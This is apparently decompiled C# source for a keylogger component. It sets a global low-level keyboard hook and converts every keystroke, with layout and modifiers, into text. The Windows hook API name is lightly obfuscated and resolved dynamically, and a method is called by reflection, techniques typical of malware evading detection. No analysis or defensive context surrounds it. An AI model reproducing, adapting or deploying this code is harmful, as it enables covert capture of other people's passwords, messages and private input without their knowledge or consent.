using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class KeyHook
{
	private delegate int SetWindowsHookEx(int Hook, KDel KeyDelegate, int HMod, int ThreadId);

	private delegate int CallNextHookEx(int Hook, int nCode, int wParam, ref KeyStructure lParam);

	private delegate int KDel(int nCode, int wParam, ref KeyStructure lParam);

	public delegate void DownEventHandler(string Key);

	public delegate void UpEventHandler(string Key);

	private struct KeyStructure
	{
		public int Code;

		public int ScanCode;

		public int Flags;

		public int Time;

		public int ExtraInfo;
	}

	private static readonly SetWindowsHookEx SetWindowsHookExA = Dynamic.CreateApi<SetWindowsHookEx>("user32", "$Set$Window$sHook$Ex$A$".Replace("$", ""));

	private static readonly CallNextHookEx CallNextHookExA = Dynamic.CreateApi<CallNextHookEx>("user32", "CallNextHookEx");

	private DownEventHandler DownEvent;

	private UpEventHandler UpEvent;

	private static int Key;

	private static KDel KHD;

	public bool Alpahbet;

	public bool Digits;

	public bool SpecialSymbols;

	public event DownEventHandler Down
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			DownEvent = (DownEventHandler)Delegate.Combine(DownEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			DownEvent = (DownEventHandler)Delegate.Remove(DownEvent, value);
		}
	}

	public event UpEventHandler Up
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			UpEvent = (UpEventHandler)Delegate.Combine(UpEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			UpEvent = (UpEventHandler)Delegate.Remove(UpEvent, value);
		}
	}

	public KeyHook()
	{
		Alpahbet = false;
		Digits = false;
		SpecialSymbols = false;
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int dwLayout);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int Hook);

	public void CreateHook()
	{
		string name = "GetExecutingAssembly";
		Assembly _Assembly = (Assembly)typeof(Assembly).GetMethod(name)!.Invoke(null, null);
		int hMod = Marshal.GetHINSTANCE(Get_Modules(ref _Assembly)).ToInt32();
		Key = SetWindowsHookExA(13, KHD, hMod, 0);
	}

	public Module Get_Modules(ref Assembly _Assembly)
	{
		KHD = Proc;
		return _Assembly.GetModules()[0];
	}

	public void DiposeHook()
	{
		UnhookWindowsHookEx(Key);
		base.Finalize();
	}

	private int Proc(int Code, int wParam, ref KeyStructure lParam)
	{
		if (Code == 0)
		{
			switch (wParam)
			{
			case 256:
			case 260:
				DownEvent?.Invoke(Feed((Keys)lParam.Code));
				break;
			case 257:
			case 261:
				UpEvent?.Invoke(Feed((Keys)lParam.Code));
				break;
			}
		}
		return CallNextHookExA(Key, Code, wParam, ref lParam);
	}

	private string Feed(Keys k)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Invalid comparison between Unknown and I4
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Invalid comparison between Unknown and I4
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Invalid comparison between Unknown and I4
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Invalid comparison between Unknown and I4
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Invalid comparison between Unknown and I4
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Invalid comparison between Unknown and I4
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Invalid comparison between Unknown and I4
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Invalid comparison between Unknown and I4
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Invalid comparison between Unknown and I4
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Invalid comparison between Unknown and I4
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Invalid comparison between Unknown and I4
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Invalid comparison between Unknown and I4
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Invalid comparison between Unknown and I4
		//IL_0176: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Invalid comparison between Unknown and I4
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Invalid comparison between Unknown and I4
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Invalid comparison between Unknown and I4
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		Alpahbet = true;
		Digits = true;
		SpecialSymbols = true;
		Keys modifierKeys = Control.get_ModifierKeys();
		Keys val = (Keys)65536;
		if ((int)k >= 65 && (int)k <= 90)
		{
			if (Alpahbet)
			{
				if (Is_Locked() || (modifierKeys & val) != 0)
				{
					return VKCodeToUnicode(checked((uint)k));
				}
				string text = VKCodeToUnicode(checked((uint)k));
				return Strings.LCase(text);
			}
			return null;
		}
		if ((int)k >= 48 && (int)k <= 57)
		{
			if ((modifierKeys & val) != 0)
			{
				return VKCodeToUnicode(checked((uint)k));
			}
			return ((Enum)k).ToString().Replace("D", null);
		}
		if ((int)k >= 96 && (int)k <= 105)
		{
			if (Digits)
			{
				return VKCodeToUnicode(checked((uint)k)).Replace("NumPad", null);
			}
			return null;
		}
		if ((int)k == 160)
		{
			return null;
		}
		if ((int)k == 161)
		{
			return null;
		}
		if ((int)k == 20)
		{
			return null;
		}
		if ((int)k == 33)
		{
			return null;
		}
		if ((int)k == 34)
		{
			return null;
		}
		if ((int)k == 36)
		{
			return null;
		}
		if ((int)k == 35)
		{
			return null;
		}
		if ((int)k == 164)
		{
			return Get_Alt();
		}
		if ((int)k == 165)
		{
			return Get_Alt();
		}
		if ((int)k == 93)
		{
			return "[Apps]";
		}
		if ((int)k == 162)
		{
			return Get_Ctrl();
		}
		if ((int)k == 163)
		{
			return Get_Ctrl();
		}
		if ((int)k == 13)
		{
			return Environment.NewLine;
		}
		if ((int)k == 8)
		{
			return "[Back]";
		}
		return VKCodeToUnicode(checked((uint)k));
	}

	public bool Is_Locked()
	{
		return Control.IsKeyLocked((Keys)20);
	}

	public string Get_Ctrl()
	{
		return "[Ctrl]";
	}

	public string Get_Alt()
	{
		return "[Alt]";
	}

	private string VKCodeToUnicode(uint V_Code)
	{
		try
		{
			uint b = MapVirtualKey(V_Code, 0u);
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!GetKeyboardState(array))
			{
				return "";
			}
			IntPtr foregroundWindow = GetForegroundWindow();
			int lpdwProcessID = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			IntPtr g = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			To_Unicode(V_Code, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)V_Code)).ToString();
	}

	public int To_Unicode(uint A, uint B, byte[] C, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder D, int E, uint F, IntPtr G)
	{
		return ToUnicodeEx(A, B, C, D, E, F, G);
	}
}
